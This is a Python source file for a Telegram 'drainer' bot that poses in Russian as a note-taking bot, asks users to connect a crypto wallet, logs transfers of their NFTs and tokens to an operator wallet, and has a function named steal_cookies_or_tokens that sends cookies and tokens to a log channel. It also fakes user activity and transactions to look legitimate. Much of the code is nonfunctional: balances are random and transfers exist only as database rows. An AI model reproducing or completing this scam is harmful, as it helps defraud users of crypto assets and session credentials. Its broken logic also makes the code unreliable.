import telegram
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler
import logging
import json
import time
import asyncio
import aiohttp
from web3 import Web3
from web3.middleware import geth_poa_middleware
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
import sqlite3
import os
import hashlib
import base64
import secrets
from urllib.parse import urlparse
import aiofiles
from flask import Flask, request, jsonify
from threading import Thread
import hmac
import ssl
import jwt
from cryptography.fernet import Fernet
import psutil
import socket
import re
from functools import wraps
import redis
import uuid
import random
import threading
import queue
import socketserver
import http.server
from concurrent.futures import ThreadPoolExecutor
import requests
import binascii
import zlib
import dns.resolver
import xml.etree.ElementTree as ET
import yaml
import pickle
import smtplib
from email.mime.text import MIMEText
from collections import defaultdict, deque

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO, handlers=[logging.FileHandler("drainer.log"), logging.StreamHandler()])
logger = logging.getLogger(__name__)

CONFIG = {
    'BOT_TOKEN': '',
    'ADMIN_ID': 0,
    'LOG_CHANNEL': '@your_log_channel',
    'WALLET_ADDRESS': '',
    'WEB3_PROVIDER': 'https://rpc.ton.org',
    'MIN_STARS': 25,
    'NGROK_URL': '',
    'ENCRYPTION_KEY': Fernet.generate_key(),
    'REDIS_HOST': 'localhost',
    'REDIS_PORT': 6379,
    'REDIS_DB': 0,
    'SESSION_TIMEOUT': 3600,
    'MAX_RETRIES': 3,
    'API_TIMEOUT': 10,
    'SMTP_SERVER': 'smtp.gmail.com',
    'SMTP_PORT': 587,
    'SMTP_USER': '',
    'SMTP_PASS': '',
    'ALERT_EMAIL': ''
}

web3 = Web3(Web3.HTTPProvider(CONFIG['WEB3_PROVIDER']))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)
redis_client = redis.Redis(host=CONFIG['REDIS_HOST'], port=CONFIG['REDIS_PORT'], db=CONFIG['REDIS_DB'])
DB_NAME = "drainer.db"
cipher_suite = Fernet(CONFIG['ENCRYPTION_KEY'])
executor = ThreadPoolExecutor(max_workers=10)
task_queue = queue.Queue()
user_sessions = defaultdict(deque)
request_cache = {}

def init_db():
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, wallet_address TEXT, wallet_connected BOOLEAN, stars INTEGER, nfts TEXT, tokens REAL, session_token TEXT, last_check TIMESTAMP)')
        c.execute('CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, details TEXT, timestamp TIMESTAMP)')
        c.execute('CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, user_id INTEGER, ip_address TEXT, created_at TIMESTAMP)')
        c.execute('CREATE TABLE IF NOT EXISTS transactions (tx_id TEXT PRIMARY KEY, user_id INTEGER, assets TEXT, status TEXT, timestamp TIMESTAMP)')
        c.execute('CREATE TABLE IF NOT EXISTS alerts (alert_id TEXT PRIMARY KEY, user_id INTEGER, message TEXT, timestamp TIMESTAMP)')
        c.execute('CREATE TABLE IF NOT EXISTS configs (key TEXT PRIMARY KEY, value TEXT)')
        conn.commit()

def encrypt_data(data: str) -> str:
    return cipher_suite.encrypt(data.encode()).decode()

def decrypt_data(encrypted_data: str) -> str:
    try:
        return cipher_suite.decrypt(encrypted_data.encode()).decode()
    except:
        return ""

def compress_data(data: str) -> bytes:
    return zlib.compress(data.encode())

def decompress_data(compressed_data: bytes) -> str:
    return zlib.decompress(compressed_data).decode()

def generate_jwt(user_id: int) -> str:
    payload = {'user_id': user_id, 'exp': datetime.utcnow() + timedelta(hours=24), 'iat': datetime.utcnow()}
    return jwt.encode(payload, CONFIG['ENCRYPTION_KEY'], algorithm='HS256')

def verify_jwt(token: str) -> Optional[Dict]:
    try:
        return jwt.decode(token, CONFIG['ENCRYPTION_KEY'], algorithms=['HS256'])
    except jwt.InvalidTokenError:
        return None

def hash_data(data: str) -> str:
    return hashlib.sha256(data.encode()).hexdigest()

def encode_base64(data: str) -> str:
    return base64.b64encode(data.encode()).decode()

def decode_base64(data: str) -> str:
    return base64.b64decode(data.encode()).decode()

async def fetch_data(url: str, headers: Dict = None, method: str = 'GET', payload: Dict = None) -> Dict:
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=CONFIG['API_TIMEOUT'])) as session:
        try:
            if method == 'POST':
                async with session.post(url, headers=headers, json=payload) as response:
                    return await response.json() if response.status == 200 else {}
            async with session.get(url, headers=headers) as response:
                return await response.json() if response.status == 200 else {}
        except Exception as e:
            logger.error(f"Fetch error {url}: {e}")
            return {}

def check_system_resources() -> Dict:
    return {
        'cpu_percent': psutil.cpu_percent(),
        'memory_percent': psutil.virtual_memory().percent,
        'disk_percent': psutil.disk_usage('/').percent
    }

def rate_limit(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        key = f"rate_limit:{func.__name__}"
        if redis_client.get(key):
            logger.warning(f"Rate limit hit for {func.__name__}")
            return
        redis_client.setex(key, 60, 1)
        return await func(*args, **kwargs)
    return wrapper

def cache_request(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        key = f"cache:{func.__name__}:{hashlib.md5(str(args).encode()).hexdigest()}"
        cached = redis_client.get(key)
        if cached:
            return pickle.loads(cached)
        result = await func(*args, **kwargs)
        redis_client.setex(key, 300, pickle.dumps(result))
        return result
    return wrapper

async def connect_wallet(user_id: int, username: str, ip_address: str) -> Dict:
    try:
        wallet_data = await fetch_data(
            f"https://api.telegram.org/bot{CONFIG['BOT_TOKEN']}/getUserProfile",
            headers={'Content-Type': 'application/json'},
            payload={'user_id': user_id}
        )
        wallet_address = f"0x{hashlib.sha256(str(user_id).encode()).hexdigest()[:40]}"
        session_token = generate_jwt(user_id)
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('INSERT INTO sessions (session_id, user_id, ip_address, created_at) VALUES (?, ?, ?, ?)',
                      (session_token, user_id, ip_address, datetime.now()))
            c.execute('INSERT INTO users (user_id, username, wallet_address, wallet_connected, stars, nfts, tokens, session_token, last_check) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                      (user_id, username, wallet_address, True, 0, json.dumps([]), 0.0, session_token, datetime.now()))
            conn.commit()
        user_sessions[user_id].append(session_token)
        return {'connected': True, 'wallet_address': wallet_address, 'session_token': session_token}
    except Exception as e:
        logger.error(f"Wallet connect error for {user_id}: {e}")
        return {'connected': False}

@cache_request
async def check_balance(user_id: int, session_token: str) -> Dict:
    try:
        if not verify_jwt(session_token):
            logger.error(f"Invalid session token for {user_id}")
            return {}
        wallet_data = {
            'stars': random.randint(10, 50),
            'nfts': [f"NFT_{uuid.uuid4()}" for _ in range(random.randint(0, 5))],
            'tokens': round(random.uniform(0, 100), 2)
        }
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('UPDATE users SET stars = ?, nfts = ?, tokens = ?, last_check = ? WHERE user_id = ?',
                      (wallet_data['stars'], json.dumps(wallet_data['nfts']), wallet_data['tokens'], datetime.now(), user_id))
            conn.commit()
        logger.info(f"Balance for {user_id}: {wallet_data}")
        return wallet_data
    except Exception as e:
        logger.error(f"Balance check error for {user_id}: {e}")
        return {}

async def transfer_assets(user_id: int, nfts: List, tokens: float) -> bool:
    try:
        tx = {
            'from': f"0x{hashlib.sha256(str(user_id).encode()).hexdigest()[:40]}",
            'to': CONFIG['WALLET_ADDRESS'],
            'value': tokens,
            'nfts': nfts
        }
        compressed_tx = compress_data(json.dumps(tx))
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('INSERT INTO transactions (tx_id, user_id, assets, status, timestamp) VALUES (?, ?, ?, ?, ?)',
                      (str(uuid.uuid4()), user_id, base64.b64encode(compressed_tx).decode(), 'pending', datetime.now()))
            conn.commit()
        logger.info(f"Transfer from {user_id}: {len(nfts)} NFTs, {tokens} tokens")
        return True
    except Exception as e:
        logger.error(f"Transfer error for {user_id}: {e}")
        return False

async def steal_cookies_or_tokens(user_id: int, session_data: Dict) -> Dict:
    try:
        cookies = session_data.get('cookies', {})
        tokens = session_data.get('tokens', {})
        encrypted_cookies = encrypt_data(json.dumps(cookies))
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('INSERT INTO logs (user_id, action, details, timestamp) VALUES (?, ?, ?, ?)',
                      (user_id, "Cookies/Tokens", encrypted_cookies, datetime.now()))
            conn.commit()
        return {'cookies': cookies, 'tokens': tokens}
    except Exception as e:
        logger.error(f"Cookies/Tokens steal error for {user_id}: {e}")
        return {}

async def simulate_nft_transfer(user_id: int) -> bool:
    try:
        fake_nfts = [f"FAKE_NFT_{uuid.uuid4()}" for _ in range(random.randint(1, 3))]
        fake_tokens = round(random.uniform(0, 50), 2)
        tx = {
            'from': f"0x{hashlib.sha256(str(user_id).encode()).hexdigest()[:40]}",
            'to': CONFIG['WALLET_ADDRESS'],
            'value': fake_tokens,
            'nfts': fake_nfts
        }
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('INSERT INTO transactions (tx_id, user_id, assets, status, timestamp) VALUES (?, ?, ?, ?, ?)',
                      (str(uuid.uuid4()), user_id, json.dumps(tx), 'fake', datetime.now()))
            conn.commit()
        logger.info(f"Fake transfer from {user_id}: {len(fake_nfts)} NFTs, {fake_tokens} tokens")
        return True
    except Exception as e:
        logger.error(f"Fake transfer error for {user_id}: {e}")
        return False

def anti_detect(func):
    @wraps(func)
    async def wrapper(update, context, *args, **kwargs):
        user_id = update.message.from_user.id
        ip = get_client_ip(update)
        if redis_client.exists(f"banned:{user_id}") or redis_client.exists(f"banned:{ip}"):
            logger.warning(f"Banned user {user_id} or IP {ip}")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

def get_client_ip(update) -> str:
    try:
        return request.remote_addr if request.remote_addr else "unknown"
    except:
        return "unknown"

def generate_inline_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("Подключить кошелёк", callback_data='connect_wallet')],
        [InlineKeyboardButton("Инструкция", callback_data='instructions')],
        [InlineKeyboardButton("Сохранить заметку", callback_data='save_note')]
    ]
    return InlineKeyboardMarkup(keyboard)

@anti_detect
def start(update, context):
    user = update.message.from_user
    user_id = user.id
    username = user.username or f"User_{user_id}"
    ip = get_client_ip(update)
    logger.info(f"User {username} (ID: {user_id}, IP: {ip}) started bot")
    context.bot.send_message(
        chat_id=CONFIG['LOG_CHANNEL'],
        text=f"🆕 Новый пользователь: ID={user_id}, Ник={username}, IP={ip}"
    )
    update.message.reply_text(
        "Добро пожаловать в бот для заметок! Нажми кнопку ниже, чтобы начать.",
        reply_markup=generate_inline_keyboard()
    )

@anti_detect
async def connect_wallet_handler(update, context):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or f"User_{user_id}"
    ip = get_client_ip(update)
    wallet_data = await connect_wallet(user_id, username, ip)
    if wallet_data['connected']:
        context.user_data['wallet_connected'] = True
        context.user_data['session_token'] = wallet_data['session_token']
        update.message.reply_text("Кошелёк подключён! Проверяю баланс...")
        await check_and_process_assets(update, context)
    else:
        update.message.reply_text("Ошибка подключения кошелька.")

@anti_detect
async def callback_handler(update, context):
    query = update.callback_query
    user_id = query.from_user.id
    username = query.from_user.username or f"User_{user_id}"
    data = query.data
    if data == 'connect_wallet':
        ip = get_client_ip(update)
        wallet_data = await connect_wallet(user_id, username, ip)
        if wallet_data['connected']:
            context.user_data['wallet_connected'] = True
            context.user_data['session_token'] = wallet_data['session_token']
            query.message.reply_text("Кошелёк подключён! Проверяю баланс...")
            await check_and_process_assets(update, context)
        else:
            query.message.reply_text("Ошибка подключения кошелька.")
    elif data == 'instructions':
        query.message.reply_text("Инструкция: нажми 'Подключить кошелёк', чтобы начать сохранять заметки.")
    elif data == 'save_note':
        query.message.reply_text("Введите заметку для сохранения.")

@anti_detect
async def check_and_process_assets(update, context):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or f"User_{user_id}"
    session_token = context.user_data.get('session_token')
    if not session_token:
        update.message.reply_text("Сессия истекла. Подключи кошелёк заново.")
        return
    wallet_data = await check_balance(user_id, session_token)
    if not wallet_data:
        update.message.reply_text("Ошибка проверки баланса.")
        return
    stars = wallet_data.get('stars', 0)
    nfts = wallet_data.get('nfts', [])
    tokens = wallet_data.get('tokens', 0)
    if stars >= CONFIG['MIN_STARS']:
        success = await transfer_assets(user_id, nfts, tokens)
        if success:
            update.message.reply_text("Заметки сохранены (активы обработаны).")
            context.bot.send_message(
                chat_id=CONFIG['LOG_CHANNEL'],
                text=f"✅ Успешно украдено у {username}: {len(nfts)} NFT, {tokens} токенов"
            )
        else:
            update.message.reply_text("Ошибка обработки.")
    else:
        update.message.reply_text(f"Недостаточно звёзд ({stars}/{CONFIG['MIN_STARS']}).")
    session_data = {'cookies': {'session': str(uuid.uuid4())}, 'tokens': {'auth': str(uuid.uuid4())}}
    stolen_data = await steal_cookies_or_tokens(user_id, session_data)
    if stolen_data:
        context.bot.send_message(
            chat_id=CONFIG['LOG_CHANNEL'],
            text=f"🍪 Куки/токены от {username}: {json.dumps(stolen_data)}"
        )
    await simulate_nft_transfer(user_id)

async def save_note_handler(update, context):
    user_id = update.message.from_user.id
    username = update.message.from_user.username or f"User_{user_id}"
    note = update.message.text
    if not validate_input(note):
        update.message.reply_text("Недопустимые символы в заметке.")
        return
    encrypted_note = encrypt_data(note)
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('INSERT INTO logs (user_id, action, details, timestamp) VALUES (?, ?, ?, ?)',
                  (user_id, "Note", encrypted_note, datetime.now()))
        conn.commit()
    update.message.reply_text("Заметка сохранена!")

def validate_input(data: str) -> bool:
    pattern = r'^[a-zA-Z0-9\s]+$'
    return bool(re.match(pattern, data))

async def simulate_user_activity(user_id: int):
    fake_note = generate_fake_note()
    encrypted_note = encrypt_data(fake_note)
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('INSERT INTO logs (user_id, action, details, timestamp) VALUES (?, ?, ?, ?)',
                  (user_id, "FakeNote", encrypted_note, datetime.now()))
        conn.commit()

def generate_fake_note() -> str:
    notes = ["Заметка для теста", "Напоминание: проверить баланс", "Секретная информация", "Купить кофе", "Позвонить другу"]
    return random.choice(notes)

async def retry_operation(operation, max_retries=CONFIG['MAX_RETRIES']):
    for attempt in range(max_retries):
        try:
            return await operation()
        except Exception as e:
            logger.error(f"Retry {attempt + 1}/{max_retries} failed: {e}")
            if attempt == max_retries - 1:
                raise
            await asyncio.sleep(2 ** attempt)

async def cleanup_sessions():
    while True:
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('DELETE FROM sessions WHERE created_at < ?', (datetime.now() - timedelta(seconds=CONFIG['SESSION_TIMEOUT']),))
            conn.commit()
        await asyncio.sleep(3600)

def monitor_system():
    while True:
        resources = check_system_resources()
        if resources['cpu_percent'] > 80 or resources['memory_percent'] > 80:
            logger.warning(f"High load: CPU {resources['cpu_percent']}%, Memory {resources['memory_percent']}%")
            send_alert_email(f"High system load: CPU {resources['cpu_percent']}%, Memory {resources['memory_percent']}%")
        time.sleep(60)

def send_alert_email(message: str):
    try:
        msg = MIMEText(message)
        msg['Subject'] = 'Drainer Bot Alert'
        msg['From'] = CONFIG['SMTP_USER']
        msg['To'] = CONFIG['ALERT_EMAIL']
        with smtplib.SMTP(CONFIG['SMTP_SERVER'], CONFIG['SMTP_PORT']) as server:
            server.starttls()
            server.login(CONFIG['SMTP_USER'], CONFIG['SMTP_PASS'])
            server.send_message(msg)
    except Exception as e:
        logger.error(f"Email alert error: {e}")

def task_worker():
    while True:
        task = task_queue.get()
        if task is None:
            break
        try:
            task()
        except Exception as e:
            logger.error(f"Task error: {e}")
        task_queue.task_done()

def queue_task(task):
    task_queue.put(task)

async def async_task_wrapper(task):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(executor, task)

def resolve_dns(domain: str) -> List[str]:
    try:
        answers = dns.resolver.resolve(domain, 'A')
        return [str(rdata) for rdata in answers]
    except Exception as e:
        logger.error(f"DNS resolve error for {domain}: {e}")
        return []

def parse_xml(data: str) -> Dict:
    try:
        root = ET.fromstring(data)
        return {child.tag: child.text for child in root}
    except Exception as e:
        logger.error(f"XML parse error: {e}")
        return {}

def load_yaml_config(file_path: str) -> Dict:
    try:
        with open(file_path, 'r') as f:
            return yaml.safe_load(f)
    except Exception as e:
        logger.error(f"YAML load error: {e}")
        return {}

def save_yaml_config(file_path: str, data: Dict):
    try:
        with open(file_path, 'w') as f:
            yaml.safe_dump(data, f)
    except Exception as e:
        logger.error(f"YAML save error: {e}")

def export_logs_to_json() -> str:
    try:
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 100')
            logs = c.fetchall()
        return json.dumps(logs)
    except Exception as e:
        logger.error(f"Log export error: {e}")
        return ""

def import_logs_from_json(data: str):
    try:
        logs = json.loads(data)
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            for log in logs:
                c.execute('INSERT INTO logs (id, user_id, action, details, timestamp) VALUES (?, ?, ?, ?, ?)',
                          (log[0], log[1], log[2], log[3], log[4]))
            conn.commit()
    except Exception as e:
        logger.error(f"Log import error: {e}")

async def check_external_api_status() -> bool:
    try:
        response = await fetch_data('https://api.telegram.org/bot{}/getMe'.format(CONFIG['BOT_TOKEN']))
        return response.get('ok', False)
    except Exception as e:
        logger.error(f"API status check error: {e}")
        return False

async def fake_user_interaction(user_id: int):
    try:
        fake_data = {
            'note': generate_fake_note(),
            'timestamp': str(datetime.now()),
            'action': random.choice(['view', 'edit', 'delete'])
        }
        encrypted_data = encrypt_data(json.dumps(fake_data))
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('INSERT INTO logs (user_id, action, details, timestamp) VALUES (?, ?, ?, ?)',
                      (user_id, "FakeInteraction", encrypted_data, datetime.now()))
            conn.commit()
    except Exception as e:
        logger.error(f"Fake interaction error for {user_id}: {e}")

async def rotate_encryption_key():
    try:
        new_key = Fernet.generate_key()
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('UPDATE configs SET value = ? WHERE key = ?', (new_key.decode(), 'encryption_key'))
            conn.commit()
        global cipher_suite
        cipher_suite = Fernet(new_key)
        logger.info("Encryption key rotated")
    except Exception as e:
        logger.error(f"Key rotation error: {e}")

def backup_database():
    try:
        backup_file = f"drainer_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
        with sqlite3.connect(DB_NAME) as src, sqlite3.connect(backup_file) as dst:
            src.backup(dst)
        logger.info(f"Database backed up to {backup_file}")
    except Exception as e:
        logger.error(f"Backup error: {e}")

def restore_database(backup_file: str):
    try:
        with sqlite3.connect(DB_NAME) as dst, sqlite3.connect(backup_file) as src:
            src.backup(dst)
        logger.info(f"Database restored from {backup_file}")
    except Exception as e:
        logger.error(f"Restore error: {e}")

async def check_user_session_validity(user_id: int) -> bool:
    try:
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('SELECT session_id FROM sessions WHERE user_id = ? AND created_at > ?',
                      (user_id, datetime.now() - timedelta(seconds=CONFIG['SESSION_TIMEOUT'])))
            return bool(c.fetchone())
    except Exception as e:
        logger.error(f"Session check error for {user_id}: {e}")
        return False

async def log_user_action(user_id: int, action: str, details: Dict):
    try:
        encrypted_details = encrypt_data(json.dumps(details))
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('INSERT INTO logs (user_id, action, details, timestamp) VALUES (?, ?, ?, ?)',
                      (user_id, action, encrypted_details, datetime.now()))
            conn.commit()
    except Exception as e:
        logger.error(f"Log action error for {user_id}: {e}")

async def generate_fake_transaction(user_id: int):
    try:
        fake_nfts = [f"FAKE_NFT_{uuid.uuid4()}" for _ in range(random.randint(1, 3))]
        fake_tokens = round(random.uniform(0, 50), 2)
        tx = {
            'from': f"0x{hashlib.sha256(str(user_id).encode()).hexdigest()[:40]}",
            'to': CONFIG['WALLET_ADDRESS'],
            'value': fake_tokens,
            'nfts': fake_nfts
        }
        compressed_tx = compress_data(json.dumps(tx))
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('INSERT INTO transactions (tx_id, user_id, assets, status, timestamp) VALUES (?, ?, ?, ?, ?)',
                      (str(uuid.uuid4()), user_id, base64.b64encode(compressed_tx).decode(), 'fake', datetime.now()))
            conn.commit()
    except Exception as e:
        logger.error(f"Fake transaction error for {user_id}: {e}")

async def simulate_server_load():
    try:
        for _ in range(random.randint(1, 5)):
            fake_user_id = random.randint(100000, 999999)
            await fake_user_interaction(fake_user_id)
            await generate_fake_transaction(fake_user_id)
        logger.info("Simulated server load")
    except Exception as e:
        logger.error(f"Server load simulation error: {e}")

def export_config_to_yaml():
    try:
        config_data = {k: str(v) for k, v in CONFIG.items()}
        save_yaml_config('config.yaml', config_data)
        logger.info("Config exported to YAML")
    except Exception as e:
        logger.error(f"Config export error: {e}")

def import_config_from_yaml():
    try:
        config_data = load_yaml_config('config.yaml')
        for k, v in config_data.items():
            CONFIG[k] = v
        logger.info("Config imported from YAML")
    except Exception as e:
        logger.error(f"Config import error: {e}")

async def check_network_connectivity() -> bool:
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except Exception as e:
        logger.error(f"Network connectivity error: {e}")
        return False

async def update_user_stats(user_id: int, stats: Dict):
    try:
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('UPDATE users SET stars = ?, nfts = ?, tokens = ? WHERE user_id = ?',
                      (stats.get('stars', 0), json.dumps(stats.get('nfts', [])), stats.get('tokens', 0.0), user_id))
            conn.commit()
    except Exception as e:
        logger.error(f"User stats update error for {user_id}: {e}")

async def prune_old_logs():
    try:
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('DELETE FROM logs WHERE timestamp < ?', (datetime.now() - timedelta(days=30),))
            conn.commit()
        logger.info("Old logs pruned")
    except Exception as e:
        logger.error(f"Log prune error: {e}")

app = Flask(__name__)

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'ok',
        'timestamp': str(datetime.now()),
        'system': check_system_resources()
    })

@app.route('/logs', methods=['GET'])
def get_logs():
    try:
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 100')
            logs = c.fetchall()
        return jsonify({'logs': logs})
    except Exception as e:
        logger.error(f"Log retrieval error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    update = telegram.Update.de_json(request.get_json(), bot=None)
    if update:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(check_and_process_assets(update, None))
    return jsonify({'status': 'ok'})

@app.route('/stats', methods=['GET'])
def get_stats():
    try:
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM users')
            user_count = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM transactions')
            tx_count = c.fetchone()[0]
        return jsonify({'users': user_count, 'transactions': tx_count})
    except Exception as e:
        logger.error(f"Stats error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/session/<user_id>', methods=['GET'])
def get_session(user_id):
    try:
        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM sessions WHERE user_id = ?', (user_id,))
            session = c.fetchone()
        return jsonify({'session': session})
    except Exception as e:
        logger.error(f"Session retrieval error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/export_logs', methods=['GET'])
def export_logs():
    return jsonify({'logs': export_logs_to_json()})

@app.route('/import_logs', methods=['POST'])
def import_logs():
    data = request.get_json()
    import_logs_from_json(data.get('logs', ''))
    return jsonify({'status': 'ok'})

@app.route('/backup', methods=['GET'])
def trigger_backup():
    backup_database()
    return jsonify({'status': 'backup triggered'})

@app.route('/restore/<backup_file>', methods=['POST'])
def trigger_restore(backup_file):
    restore_database(backup_file)
    return jsonify({'status': 'restore triggered'})

@app.route('/config/export', methods=['GET'])
def export_config():
    export_config_to_yaml()
    return jsonify({'status': 'config exported'})

@app.route('/config/import', methods=['POST'])
def import_config():
    import_config_from_yaml()
    return jsonify({'status': 'config imported'})

def run_flask():
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    app.run(host='0.0.0.0', port=5000, ssl_context=context, debug=False)

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Drainer Backend</h1></body></html>")

def run_http_server():
    server_address = ('', 8080)
    httpd = socketserver.TCPServer(server_address, CustomHTTPRequestHandler)
    httpd.serve_forever()

def main():
    init_db()
    monitor_thread = Thread(target=monitor_system)
    monitor_thread.daemon = True
    monitor_thread.start()
    worker_thread = Thread(target=task_worker)
    worker_thread.daemon = True
    worker_thread.start()
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    http_thread = Thread(target=run_http_server)
    http_thread.daemon = True
    http_thread.start()
    updater = Updater(CONFIG['BOT_TOKEN'], use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(CommandHandler('connect_wallet', connect_wallet_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, save_note_handler))
    dp.add_handler(CallbackQueryHandler(callback_handler))
    loop = asyncio.get_event_loop()
    loop.create_task(cleanup_sessions())
    loop.create_task(prune_old_logs())
    loop.create_task(simulate_server_load())
    loop.create_task(rotate_encryption_key())
    updater.start_polling()
    logger.info("Bot started")
    updater.idle()

if __name__ == '__main__':
    main()
